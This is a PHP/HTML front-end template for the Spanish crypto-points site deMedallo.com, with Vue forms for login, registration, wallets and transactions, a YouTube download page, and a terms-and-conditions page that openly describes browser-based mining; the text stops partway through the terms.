<?php 
	include('_cms/autoload.php');
	$app = include_once('api/YouTube-Downloader/bootstrap.php');
?>
<!doctype html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<meta name="description" content="">
		<meta name="author" content="">
		<link rel="icon" href="favicon.ico">
		<title>deMedallo.com | Musica, Series, Videos, Tutoriales, Descargas y mucho mas!!</title>
		<link href="dist/bootstrap/4.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
		<link href="assets/carousel.css" rel="stylesheet">
		<!--<link href="assets/style.css" rel="stylesheet">-->
		<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
		<link href="https://vjs.zencdn.net/7.1.0/video-js.css" rel="stylesheet">
		<!-- If you'd like to support IE8 (for Video.js versions prior to v7) -->
		<!-- <script src="https://vjs.zencdn.net/ie8/ie8-version/videojs-ie8.min.js"></script> -->
		
		<script src="//content.jwplatform.com/libraries/IDzF9Zmk.js"></script>

			<script src="https://unpkg.com/vue/dist/vue.js"></script>
		<!--
			<script src="https://unpkg.com/vue-router/dist/vue-router.js"></script>
		-->
		<!-- <script src="https://cdn.jsdelivr.net/npm/vue@2.5.17/dist/vue.js"></script> -->
		<script src="https://cdnjs.cloudflare.com/ajax/libs/vue-router/3.0.1/vue-router.js"></script>
		<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
		
		<!--<script type="text/javascript" src="http://api.solvemedia.com/papi/challenge.ajax"></script>-->
		
	</head>
	<body>
		<div id="app"></div>
		
		<template id="formLogin-template">
			<div>
				<form id="loginForm" method="POST" action="javascript:false; " @submit="submitLogin">
					<div class="dropdown-divider"></div>					
					<div class="dropdown-item"><label for="email">Usuario o Correo Electronico</label></div>
					<div class="dropdown-item"><input class="form-control" type="text" v-model="mailornick" name="mailornick" id="input-mailornick-modal"></div>
					<div class="dropdown-item"><label for="password">Contraseña</label></div>
					<div class="dropdown-item"><input class="form-control" type="password" v-model="hash" name="hash" id="password"></div>
					<div class="dropdown-item"><label for="password">Captcha</label></div>
					<div class="dropdown-item"><div id="acwidget-login-page"><div id="acwidget-login"><a @click="$parent.realoadCaptcha('acwidget-login-page')">Haz clic si no aparece el captcha.</a></div></div></div>
					
					<div class="dropdown-divider"></div>
					<div class="alert alert-dark" role="alert" v-if="error == true">
					  {{ message }}
					</div>
					<div class="dropdown-divider"></div>
					<div class="dropdown-item"><input class="btn btn-success" type="submit" id="login" value="Ingresar"></div>
					<!-- <label for="checkbox"><input type="checkbox" id="checkbox"> <i>Remember me</i></label> -->
					<div class="dropdown-divider"></div>
				</form>
			</div>
		</template>
		
		<template id="formRegister-template">
			<div>
				<div class="content_middle">
					<div class="container">
						<div class="row">
							<div class="col-md-12">
								<div class="alert alert-dark" role="alert" v-if="error == true">
								  {{ message }}
								</div><div class="dropdown-divider"></div>
							
								<div class="panel panel-primary" style="margin:20px;">
									<div class="panel-heading"><h3 class="panel-title">Formulario de registro</h3></div>
									<div class="panel-body">
										<form method="POST" class="form row" action="javascript:false;" @submit="submitRegister">
											<div class="col-md-6 col-sm-6">
												<div class="form-group col-md-12 col-sm-12">
													<label for="name">Nombre Completo*</label>
													<input type="text" class="form-control input-sm" name="name" v-model="name" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="name">Nick / Usuario*</label>
													<input type="text" class="form-control input-sm" name="nick" v-model="nick" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="email">Correo Electronico*</label>
													<input type="email" class="form-control input-sm" name="email" v-model="email" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode">Contraseña*</label>
													<input type="password" class="form-control input-sm" name="pass1" v-model="pass1" placeholder="">
												</div>
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode">Verificar Contraseña*</label>
													<input type="password" class="form-control input-sm" name="pass2" v-model="pass2" placeholder="">
												</div>
											</div>

											<div class="col-md-6 col-sm-6">
												<div class="form-group col-md-12 col-sm-12" >
													<div class="dropdown-item"><div id="acwidget-register-page"><div id="acwidget-register"><a @click="$parent.realoadCaptcha('acwidget-register')">cargar CatpChat</a></div></div></div>
												</div>
												
												<div class="form-group col-md-12 col-sm-12">
													<label for="pincode">Terminos y condiciones</label>
													<span class="help-block">Al registrase se da por enterado que el propietario de la cuenta leyó y acepta nuestros terminos y condiciones.</span>
												</div>
												
												<div class="form-group col-md-12 col-sm-12 pull-right" >
													<input type="submit" class="btn btn-primary" value="Crear mi cuenta"/>
												</div>
											</div>
										</form>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>				
			</div>
		</template>

		<template id="myaccountModal-template">
			<div>
				<div class="dropdown-divider"></div>
				<div class="dropdown-item" ><b>Nombres</b>: {{ $parent.name }}</div>
				<div class="dropdown-item" ><b>Email</b>: {{ $parent.mail }}</div>
				<div class="dropdown-item" ><b>Referidos</b>: {{ $parent.refers }}</div>
				
				<div class="dropdown-divider"></div>
				<div class="dropdown-item" href="#">
					<h3>
						Wallets
						<router-link tag="a" v-bind:to="'/createWallet'" class="btn-group-vertical pull-right">
							 <button type="button" class="btn btn-success btn-sm">
								<i class="fa fa-plus"></i> 
								Agregar
							 </button>
						</router-link>
					</h3>
				</div>
			
				<fieldset class="dropdown-item" v-for="wallet in $parent.wallets">
					<label>{{ wallet.symbol }} - {{ wallet.name }}</label>
					<table class="table table-responsive">
						<tr>
							<th colspan="3">
								Address: <router-link tag="a" colspan="2" v-bind:to="'/wallet/' + wallet.address + '/' + wallet.coin_id">{{ wallet.address }}</router-link>
							</th>
						</tr>
						<tr>
							<td v-bind:class="'wallet-' + wallet.symbol + '-balance'">{{ wallet.balance.toFixed(wallet.decimals) }}</td>
							<td colspan="2">{{ wallet.symbol }}</td>
						</tr>
						<tr>
							<td>
								<a @click="removeWallet(wallet.coin_id)" class="btn-group-vertical" v-if="wallet.symbol != 'DM'">
									 <button type="button" class="btn btn-danger btn-sm">
										<i class="fa fa-remove"></i> 
									 </button>
								</a>
								<router-link tag="a" class="btn btn-secondary" v-bind:to="'/lastTx/' + wallet.address + '/' + wallet.coin_id">Transacciones</router-link>
							</td>
							<td>
								<router-link tag="a" class="btn btn-info" v-bind:to="'/exchange/' + wallet.address + '/' + wallet.symbol">Convertir</router-link>
							</td>
							<td>
								<router-link v-if="wallet.symbol == 'DM'" tag="a" class="btn btn-info" v-bind:to="'/sendW/' + wallet.symbol">Enviar</router-link>
								<router-link v-else="" tag="a" class="btn btn-info disabled" v-bind:to="'/withdraw/' + wallet.symbol">Retirar / Withdraw</router-link>
							</td>
						</tr>
					</table>
					
				</fieldset>
			</div>
		</template>
		
		<template id="viewWallets-template">
			<div>
				<div class="container marketing" v-if="error == false">
					<h1><hr>Visor de Billetera:  <span></span></h1>
					<h2>{{ balance.toFixed(decimals) }} {{ symbol }}</h2>
					<hr>
					<div class="row">
					  <div class="col-md-6">
						<table class="table">
							<tr><th>Address</th><td>{{ $route.params.address }}</td></tr>
							<tr><th>Name</th><td>{{ name }}</td></tr>
							<tr><th>Symbol</th><td>
								<router-link tag="a" v-bind:to="'/teamW/' + $route.params.coin_id">{{ symbol }}</router-link>
							</td></tr>
							<tr><th>Decimals</th><td>{{ decimals }}</td></tr>
							<tr><th>Balance</th><td>{{ balance.toFixed(decimals) }}</td></tr>
							<tr><th>Total Envios</th><td>{{ totalSend.total }}</td></tr>
							<tr><th>Valor Total Enviado</th><td>{{ totalSend.value }}</td></tr>
							<tr><th>Total Recibido</th><td>{{ totalRecibe.total }}</td></tr>
							<tr><th>Valor Total Recibido</th><td>{{ totalRecibe.value }}</td></tr>
						</table>
					  </div>
					  <div class="col-md-6">
						<h2>Ultimas Actividades</h2>
						<table class="table table-responsive" style="zoom: 0.7;">
							<tr>
								<th>Tx</th>
								<th>From</th>
								<th>To</th>
								<th>Value</th>
								<th>Coin</th>
							</tr>
							<tr v-for="tx in lastTx" :key="tx.tx">
								<td title="">
									<router-link tag="a"  :to="'/tx/' + tx.tx">{{ tx.tx }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.from + '/' + tx.coinInfo.id">{{ tx.from }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.to + '/' + tx.coinInfo.id">{{ tx.to }}</router-link>
								</td>
								<td>{{ tx.value.toFixed(decimals) }}</td>
								<td>{{ tx.coinInfo.symbol }}</td>
							</tr>
						</table>
						<router-link tag="a" v-bind:to="'/lastTx/' + $route.params.address + '/' + $route.params.coin_id"  class="btn btn-md btn-primary">Ver mas</router-link>
					  </div>
					</div>
				</div>
				
				 
				<div class="container marketing" v-else="">
					<h1><hr>Visor de Billetera:  <span></span></h1>
					<h2></h2>
					<hr>
					<div class="row">
						<div class="col-md-12">
							<h3>Billetera: <span>{{ $route.params.address }} </span></h3>
							<p>Billetera no encontrada verifique la direccion e intente nuevamente.</p>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewTx-template">
			<div>
				<div class="container marketing">
					<h1><hr>Visor de Transaccion</h1>
					<hr>
					<div class="row">
						<hr>
						<div class="col-md-12" v-if="error == false">
							<h3>Transaccion: <span>{{ $route.params.tx }}  ( {{ coinInfo.symbol }} )</span></h3>
							<table class="table table-responsive">
								<tr>
									<th>TxHash</th>
									<td>{{ tx }}</td>
								</tr>
								<tr>
									<th>TimeStamp</th>
									<td>{{ create }}</td>
								</tr>
								<tr>
									<th>From</th>
									<td>
										<router-link tag="a" v-bind:to="'/wallet/' + from + '/' + coinInfo.id">{{ from }}</router-link>
									</td>
								</tr>
								<tr>
									<th>To</th>
									<td>
										<router-link tag="a" v-bind:to="'/wallet/' + to + '/' + coinInfo.id">{{ to }}</router-link>
									</td>
								</tr>
								<tr>
									<th>Decimals</th>
									<td>{{ coinInfo.decimals }}</td>
								</tr>
								<tr>
									<th>Value</th>
									<td>{{ value }}</td>
								</tr>
								<tr>
									<th>Input data</th>
									<td><textarea class="form-control" readonly="" spellcheck="false" style="width: 100%; font-size: small; font-family: Monospace; padding: 8px; background-color: #EEEEEE;" rows="5" id="inputdata">{{ data }}</textarea></td>
								</tr>
								<tr>
									<th></th>
									<td>
										<router-link class="btn btn-info btn-md" tag="a" v-bind:to="'/decodeTx/' + tx">Decode Input Data <i class="fa fa-cog"></i></router-link>
									</td>
								</tr>
							</table>
						</div>
						<div class="col-md-12" v-else="">
							<h3>Transaccion: <span>{{ $route.params.tx }} </span></h3>
							<p>Transaccion no encontrada verifique el TX e intente nuevamente.</p>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewLastTx-template">
			<div>
				<div class="container marketing">
					<h1><hr>Ultima Actividad</h1>
						<table class="table">
							<tr>
								<th>Address</th>
								<td>
									<router-link tag="a" v-bind:to="'/wallet/' + address + '/' + $route.params.coin_id">{{ address }}</router-link>
								</td>
								<th>Name</th>
								<td>{{ name }}</td>
							</tr>
							<tr>
								<th>Symbol</th>
								<td><router-link tag="a" v-bind:to="'/teamW/' + $route.params.coin_id">{{ symbol }}</router-link></td>
								<th>Decimals</th>
								<td>{{ decimals }}</td>
							</tr>
							<tr>
								<th><h3>Balance: </h3></th>	
								<td>{{ balance }}</td>
							</tr>
						</table>
					<div class="row">
					  <div class="col-md-12">
						<h2>Ultimas Actividades</h2>
						<table class="table table-responsive" style="zoom: 0.7;">
							<tr>
								<th>Tx</th>
								<th>From</th>
								<th>To</th>
								<th>Value</th>
								<th>Coin</th>
							</tr>
							<tr v-for="tx in lastTx">
								<td title="">
									<router-link tag="a"  :to="'/tx/' + tx.tx">{{ tx.tx }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.from + '/' + tx.coinInfo.id">{{ tx.from }}</router-link>
								</td>
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + tx.to + '/' + tx.coinInfo.id">{{ tx.to }}</router-link>
								</td>
								<td>{{ tx.value.toFixed(decimals) }}</td>
								<td>{{ tx.coinInfo.symbol }}</td>
							</tr>
						</table>
					  </div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewTeamW-template">
			<div>
				<div class="container marketing">
					<h1><hr>Participantes : {{ name }} ( {{ symbol }} )</h1>
					<hr>
					
					<table class="table">
						<tr>
							<th>Name</th>
							<td>{{ name }}</td>
						</tr>
						<tr>
							<th>Symbol</th>
							<td>{{ symbol }}</td>
						</tr>
						<tr>
							<th>Decimals</th>
							<td>{{ decimals }}</td>
						</tr>
					</table>
					
					<div class="row">
					  <div class="col-md-12">
						<table class="table" style="zoom: 0.7;">
							<tr>
								<th>Address</th>
								<th>Balance</th>
							</tr>
							<tr v-for="wallet in wallets">
								<td title="">
									<router-link tag="a" v-bind:to="'/wallet/' + wallet.address + '/' + wallet.coin_id">{{ wallet.address }}</router-link>
								</td>
								<td title="">{{ wallet.balance }}</td>
							</tr>
						</table>
					  </div>
					</div>
					<hr>
				</div>
			</div>
		</template>
		
		<template id="viewSendW-template">
			<div>
				<div class="container marketing">
					<h1><hr>Enviar : {{ $parent.wallets[$route.params.coin_symbol].name }} ( {{ $route.params.coin_symbol }} )</h1>
					<h3>Balance: {{ $parent.wallets[$route.params.coin_symbol].balance.toFixed($parent.wallets[$route.params.coin_symbol].decimals) }}</h3>
					<hr>
					<!-- ALERTS -->
					<div class="alert alert-danger" role="alert" v-if="error == true">
					  {{ message }}
					</div>
					<div class="alert alert-success" role="alert" v-if="error == false && message != ''">
						{{ message }}
						<hr>
						<router-link tag="a" :to="'/tx/' + txResult">{{ txResult }}</router-link>
					</div>
					
					<div class="dropdown-divider"></div>
								
					<form method="POST" action="javascript:false;" @submit="submitSendW">
						<table class="table">
							<tr>
								<th>Direccion Destino</th>
								<td><input class="form-control" type="text" value="" v-model="to"></td>
							</tr>
							<tr>
								<th>Valor</th>
								<td><input class="form-control" type="number" v-model="value" min="0" :step="step" ></td>
							</tr>
							 
							<tr>
								<th>Fee</th>
								<td><input class="form-control" disabled value="0" v-model="fee"></td>
							</tr>
							<tr>
								<th>Data</th>
								<td><textarea class="form-control" spellcheck="false" style="width: 100%; font-size: small; font-family: Monospace; padding: 8px; background-color: #EEEEEE;" rows="5" v-model="data"></textarea></td>
							</tr>
							<tr>
								<th>Captcha</th>
								<td class="text-center"><div id="acwidget-sendW"></div></td>
							</tr>
							<tr>
								<th></th>
								<td><input type="submit" class="btn btn-success" value="Enviar"></td>
							</tr>
						</table>
					</form>
				</div>
			</div>
		</template>
		
		<template id="headerSearch-template">
			<div>
				<div class="banner">
				  <div class="container_wrap">
					<h1>¿Que Buscas?</h1>
					<form class="" method="search" action="javascript:false; " @submit="submitSearch">
						<input type="text"  name="q" id="q2" value="" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = '';}" v-model="search">
						<div class="contact_btn">
						   <label class="btn1 btn-2 btn-2g"><input class="btn btn-default btn-lg" type="submit" name="type"  value="Buscar"></label>
						</div>
					</form>        		
					<div class="clearfix"></div>
				  </div>
				</div>
			</div>
		</template>
		
		<template id="Footer-template">
			<div>
				<footer class="container">
					<p class="float-right"><a href="#">Back to top</a></p>
					<p>Donations &middot; <a><b>ETH</b>: 0x0cb159875098ad4ee77b5c3d4f6de636c823235b</a> &middot; <a href="terms-and-conditions.dm">Terms</a></p>
				</footer>
				<div class="footer">
					<div class="container">
						<!--
						<div class="footer_top">
							<h3>Subscribe to our newsletter</h3>
							<form>
								<span>
									<i><img src="images/mail.png" alt=""></i>
									<input type="text" value="Enter your email" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Enter your email';}">
									<label class="btn1 btn2 btn-2 btn-2g"> <input name="submit" type="submit" id="submit" value="Subscribe"> </label>
									<div class="clearfix"> </div>
								</span>
							</form>
						</div>
						-->		
						<div class="footer_grids">
							<div class="footer-grid">
								<h4>Link Oficiales</h4>
								<ul class="list1">
									<!-- <li><a href="contact.html">Contact</a></li> -->
									<li><router-link tag="a" v-bind:to="'/'">¿Buscas algo?</router-link></li>
									<li><a href="http://demedallo.com/mining/">Minar sin programas</a></li>
									<li><router-link tag="a" v-bind:to="'/viewTermsPage'">Terms and conditions</router-link></li>
								</ul>
								<h4>Links Externos</h4>
								<ul class="list1">
									<li><a href="https://www.facebook.com/TiendadeMedallo/">Facebook</a></li>
									<li><a href="https://github.com/deMedallo/">GitHub</a></li>
								</ul>
							</div>
							<div class="footer-grid">
								<h3>Estadisticas deMedallo</h3>
								<h4>Monero</h4>
								<ul class="list1">
									<li><b>Minado: </b>{{ $parent.minerInfo.XMR.hashes }} H</li>
									<li><b>Disponible (Exchange): </b>{{ $parent.minerInfo.XMR.reward }} XMR</li>
								</ul>
								<h4>WebChain</h4>
								<ul class="list1">
									<li><b>Minado: </b>{{ $parent.minerInfo.WEB.hashes }} H</li>
									<li><b>Disponible (Exchange): </b>{{ $parent.minerInfo.WEB.reward }} WEB</li>
								</ul>
							</div>
							<div class="footer-grid last_grid">
								<h4>Follow Us</h4>
								
								<a href="https://www.facebook.com/TiendadeMedallo/"> <i class="fa fa-facebook fa-2x"> </i> </a>
								<a href="https://github.com/deMedallo/"> <i class="fa fa-github fa-2x"> </i> </a>
							<div class="copy wow fadeInRight" data-wow-delay="0.4s">
							  <p>© 2014 deMedallo.com. Developed by <a href="#" target="_blank">FelipheGomez</a></p>
							</div>
						  </div>
						  <div class="clearfix"> </div>
					   </div>
				  </div>
				</div>
			</div>
		</template>
		
		<template id="searchPage-template">
			<div>
				<div class="content_middle">
					<hr>
					<div class="container">
						<div class="content_middle_box">
							<div class="top_grid">
								<!-- <gcse:searchresults-only></gcse:searchresults-only> -->
								<div id="resultsGoogle"></div>
								<div class="clearfix"> </div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewVideoYoutube-template">
			<div>
				<div class="container marketing">
					<div class="row">
						<div class="col-md-12">
							<div class="col-md-12">
								<h2><br>{{ title }}</h2>
								<hr>
							</div>
							<div class="col-md-12">
								<div class="row">
									<div class="col-md-9">
										<div class="row">
											<div class="col-md-12">
												<iframe width="100%" v-if="total_videos == 0" height="420" :src="urlYT"> </iframe>
												<div id="player"></div>
												<hr>
											</div>
											
											<div class="col-md-12">
											
												<div class="col-md-12">
													<div class="row">
													  <div class="col-md-7">
														<h3>{{ title }} <!--<span class="text-muted">[ {{ videoid }} ]</span>--></h3>
														<p class="lead">{{ description }}</p>
														<hr>
													  
														<h5>Contenido con Puntos!<hr></h5>
														<p>Ahora con deMedallo adquiere Puntos DM <b>GRATIS</b> por cada <b>Segundo</b> visto, actualmente tienes 0.</p>
														
													  </div>
													  <div class="col-md-5">
														<img class="img-thumbnail rounded-circle" :data-src="'https://i.ytimg.com/vi/' + videoid + '/hqdefault.jpg'" :src="'https://i.ytimg.com/vi/' + videoid + '/hqdefault.jpg'" alt="">
													  </div>
													</div>
												</div>
												
												<div class="col-md-12">
													<h2>Videos</h2>
													<hr>
												</div>
												<div class="col-md-12">
													<div class="row">
														<div class="col-lg-3" v-for="audio in videos">
															<!--<img class="rounded-circle" :src="'https://i.ytimg.com/vi/' + videoid + '/hqdefault.jpg'" alt="" width="140" height="140">-->
															<h5>{{ audio.label }}</h5>
															<p>{{ audio.size }}</p>
															<p>
																<a class="btn btn-sm btn-primary btn-download" :href="audio.file" class="mime"> <i class="fa fa-download"></i></a>
															</p>
														</div>
													</div>
												</div>
												<div class="col-md-12">
													<div id="resultsGoogleVideos"></div>
												</div>
											</div>
										</div>
									</div>
									<div class="col-md-3">
										<div class="col-md-12">
											<h2>Audios</h2>
											<hr>
										</div>
										<ul class="feature last_grid" v-for="video in audios">
											<li> <i class="icon-video"></i></li>
											<li class="feature_right">
												<h5>
													{{ video.label }}
													<a class="btn btn-default btn-type disabled" href="#">{{ video.size }}</a>
												</h5>								
												<p>
													<a class="btn btn-sm btn-primary btn-download" :href="video.file" class="mime"> <i class="fa fa-download"></i></a>
												</p>
											</li>
											<hr>
											<div class="clearfix"></div>
										</ul>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</template>
		
		<template id="viewTermsPage-template">
			<div>
				<div class="container-fluid p-0" id="content-wrapper">
					<div id="content-container" class="faq py-3">
						<div class="container">
							<div class="row">
								<div class="col">
									<h1 class="page-title">Términos y condiciones</h1>
									<b>ATENCIÓN: </b> Lea detenidamente estos términos y condiciones, ya que afectan sus obligaciones y derechos legales, que incluyen, entre otros, exenciones de derecho y limitación de responsabilidad. Si no está de acuerdo con estos términos y condiciones, no proceda con su registro en deMedallo.
									<hr>
								</div>
							</div>
							<div class="row mt-3">
								<ul>
									<li><a href="#Agreement">Acuerdo</a></li>
									<li><a href="#Eligibility">Elegibilidad</a></li>
									<li><a href="#Services">Servicios</a></li>
									<li><a href="#DM-Account">Cuenta deMedallo</a></li>
									<li><a href="#DM-Protocol">Protocolo deMedallo</a></li>
									<li><a href="#Wallet-Operations">Operaciones de billetera</a></li>
									<li><a href="#DM-fees">deMedallo</a></li>
									<li><a href="#Your-warranties-and-representations">Sus garantías y representaciones</a></li>
									<li><a href="#No-Warranties-Exclusion-of-Liability-Indemnification">Sin garantías, Exclusión de responsabilidad, Indemnización</a></li>
									<li><a href="#Third-Party-Websites-and-content">Sitios web y contenido de terceros</a></li>
									<li><a href="#Taxes">Impuestos</a></li>
									<li><a href="#Jurisdiction-applicable-law">Jurisdicción, ley aplicable</a></li>
									<li><a href="#Miscellaneous">Diverso</a></li>
								</ul>
							</div>
							<hr>
							<div class="row mt-4">
								<div class="col-12">
									<h2 id="Agreement" class="question-title">Acuerdo</h2>
								</div>
								<div class="col-12">
									<p>Este es un contrato entre usted y deMedallo ( <a href="http://www.demedallo.com/" target"_blank"> www.demedallo.com </a> ). Al registrarse para obtener una cuenta en deMedallo, acepta que es elegible como usuario del sitio web porque ha leído, entendido y aceptado estos Términos y condiciones. Al registrarse, se agrega automáticamente a nuestra lista de correo y, en caso de que desee cancelar la suscripción, siempre encontrará un enlace de cancelación de suscripción al final de cada correo electrónico.</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Eligibility" class="question-title">Elegibilidad</h2>
								</div>
								<div class="col-12">
									<p>Puede usar el sitio web si es elegible de acuerdo con las leyes vigentes donde reside. La Plataforma no tiene la obligación de verificar si usted es elegible para usar el sitio web y no es responsable de su uso de deMedallo. La Plataforma se reserva el derecho de bloquear su cuenta en el sitio web si tenemos dudas con respecto a su elegibilidad.</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Services" class="question-title">Servicios</h2>
								</div>
								<div class="col-12">
									<p>Puede usar su cuenta deMedallo bajo estos términos y condiciones para recibir los siguientes servicios: </p>
									<ol style="list-style-type: lower-alpha;">
										<li>Generación de puntos y criptomonedas basada en navegador a través de nuestro minero de JavaScript</li>
										<li>Gestión electrónica de la billetera y todas las transacciones que realiza en ella (almacenamiento, seguimiento, recepción y transferencia de sus criptomonedas)</li>
										<li>Emisión de tokens, es decir, los tokens que emite o los tokens que adquiere y / u opera en nuestro sitio</li>
									</ol>
									<p>La Plataforma le concede una licencia limitada, no exclusiva, intransferible y revocable para utilizar el sitio web a través de su cuenta de forma gratuita. Todos los servicios disponibles en el sitio son las funciones deMedallo habilitadas por deMedallo Company no es un valor, no está registrado con ninguna entidad gubernamental como garantía, y en ningún caso se considerará como tal. deMedallo no pretende ser una mercancía o cualquier otro tipo de instrumento financiero, no representa ninguna participación, capital, participación o seguridad en la Plataforma o derechos equivalentes, incluidos, entre otros, los derechos de propiedad intelectual, y no lo hace. representar cualquier derecho de propiedad.</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="CoinIMP-Account" class="question-title">Cuenta deMedallo</h2>
								</div>
								<div class="col-12">
									<p>Para comenzar a usar la cuenta deMedallo, debe registrarse para obtener una cuenta en <a href="http://www.demedallo.com/" target"_blank">http://www.demedallo.com</a>, proporcionar su dirección de correo electrónico y aceptar estos Términos y condiciones, la <a href="privacy-policy.dm" target="_blank">Política de privacidad</a> y también recibir todos los avisos legales, incluidas las declaraciones de riesgo y los estados permanentes. o eventuales renuncias de responsabilidad. Debe garantizar la seguridad y confidencialidad de su contraseña y asumir todos los riesgos relacionados con la divulgación de su contraseña a terceros. La Plataforma o cualquier persona afiliada no posee su contraseña y en ningún caso asumirá ninguna responsabilidad en caso de pérdida de la contraseña o su divulgación a un tercero.</p>
									<p>La Plataforma puede rechazar su registro, limitar el número de sus cuentas de deMedallo o restringir su uso de los Servicios de la Plataforma a su exclusivo criterio. </br>La Plataforma puede solicitarle que proporcione, en cualquier etapa, información personal adicional</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="CoinIMP-Protocol" class="question-title">Protocolo deMedallo</h2>
								</div>
								<div class="col-12">
									<p>Este protocolo rige las relaciones entre deMedallo y todas aquellas criptomonedas habilitadas, ahora o en el futuro, para ser minadas en su sitio web por sus visitantes utilizando nuestros complementos.</p>
									<p>La Plataforma le brinda la oportunidad técnica de emitir criptomonedas, usted es la única persona responsable de cualquier pérdida, daño o reclamo relacionado con la emisión de criptomonedas.</p>
									<p>Al emitir criptomonedas o tokens, garantiza y declara que ha recibido todas las aprobaciones, autorizaciones, licencias o registros requeridos por la autoridad competente en la jurisdicción de su residencia o en cualquier otra jurisdicción aplicable.</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Wallet-Operations" class="question-title">Operaciones de Billetera</h2>
								</div>
								<div class="col-12">
									<p>Puede guardar criptomonedas y puntos en su monedero deMedallo, enviarlas y recibirlas de terceros de acuerdo con las instrucciones y limitaciones de cualquiera de estos operadores de criptomoneda en particular. La Plataforma no brinda ningún servicio o asesoramiento financiero, incluidos, entre otros, la recepción o el envío de depósitos. La Plataforma no almacena su clave privada de monedero y no tiene acceso a las criptomonedas y fichas que se muestran en su saldo de Wallet.</p>
									<p>La Plataforma no asume ninguna responsabilidad u obligación en relación con cualquier intento de usar una billetera en particular para mantener una criptomoneda o token que no sea compatible con otra cadena de bloques pero que sea compatible con deMedallo.</p>
									<p>La Plataforma no tiene control ni responsabilidad por la entrega, calidad, seguridad, legalidad o cualquier otro aspecto de los bienes o servicios que pueda vender o comprar a un tercero (incluidos otros usuarios en el sitio web). Cualquier disputa que tenga con respecto a una transacción con criptomonedas, se resolverá con dicho tercero directamente sin involucrar a la Plataforma. Si cree que un tercero se comportó de manera fraudulenta, engañosa o inapropiada, o si no puede resolver adecuadamente una disputa con un tercero, puede notificarlo a nuestro equipo de asistencia para que podamos considerar qué medidas tomar, si alguna.</p>
									<p>La Plataforma puede usar un procesador de pagos de terceros para permitirle realizar pagos con cualquier moneda fiduciaria (emitida por el gobierno) en el sitio, sin asumir la responsabilidad de las acciones que usted, como usuario, decida ejecutar con este procesador de pagos</p>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="coinimp-fees" class="question-title">deMedallo</h2>
								</div>
								<div class="col-12">
									<p>Pagará todas las tarifas especificadas en esta sección: (i) las tarifas se basan en los servicios que se le ofrecen en demedallo.com; se deducirá una comisión mínima del 1% y máxima del 5% de sus monedas minadas a medida que usted lo acepte al registrarse en el sitio; (ii) las tarifas de transacción se establecen a discreción de la compañía y se le muestran antes de completar cualquier transacción en su billetera deMedallo; (iii) las obligaciones de tarifas son no cancelables y no negociables, y las tarifas abonadas no son reembolsables</p>
								</div>
							</div>        
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="Your-warranties-and-representations" class="question-title">Sus garantías y representaciones</h2>
								</div>
								<div class="col-12">
									<p>Al ingresar estos Términos y condiciones, garantiza y representa eso:</p>
									<ol style="list-style-type: lower-alpha;">
										<li>Usted tiene plena capacidad para contratar bajo las leyes aplicables;</li>
										<li>Solo realiza transacciones en el sitio web con fondos obtenidos legalmente que le pertenecen;</li>
										<li>No promoverá, realizará, se comprometerá, ayudará o instigará ninguna actividad ilícita a través de su relación con nosotros o mediante el uso de la plataforma;</li>
										<li>No utilizará la plataforma para fines ilegales, incluido el lavado de dinero procedente de actividades delictivas, la transferencia o el recibo de pagos por la planificación, preparación o comisión de delitos, para financiar el terrorismo y el comercio ilegal;</li>
										<li>No utilizará la plataforma para ningún propósito prohibido por estos Términos ni de ninguna manera que pueda dañar, deshabilitar, sobrecargar o dañar la Plataforma;</li>
										<li>Cumplirá y obedecerá todas las leyes aplicables, incluidos, entre otros, el terrorismo contra el blanqueo de capitales y la falsificación, las leyes de protección del consumidor, la promoción financiera, etc.</li>
									</ol>
								</div>
							</div>
							<hr>
							<div class="row mt-3">
								<div class="col-12">
									<h2 id="No-Warranties-Exclusion-of-Liability-Indemnification" class="question-title">Sin garantías; Exclusión de responsabilidad; Indemnización</h2>
								</div>
								<div class="col-12">
									<p>El sitio web y sus componentes, como la cuenta deMedallo, deMedalloJavaScripts y cualquier otra herramienta o sitio relacionado, se proporcionan "tal cual". La Plataforma y sus componentes están en desarrollo, la Plataforma no puede garantizar una funcionalidad completa para cualquier período en el futuro o que la funcionalidad de la Plataforma no cambiará drásticamente. La Plataforma y sus afiliados eventuales no hacen representaciones o garantías de ningún tipo, ya sean expresas, implícitas, estatutarias o de otro tipo, incluida cualquier garantía de que el sitio web no se vea interrumpido, libre de errores o de componentes dañinos, seguros o no perdidos o dañado. Excepto en la medida en que lo prohíba la ley, la Plataforma y sus afiliados eventuales renuncian a todas las garantías, incluidas las garantías implícitas de comerciabilidad, calidad satisfactoria,</p>
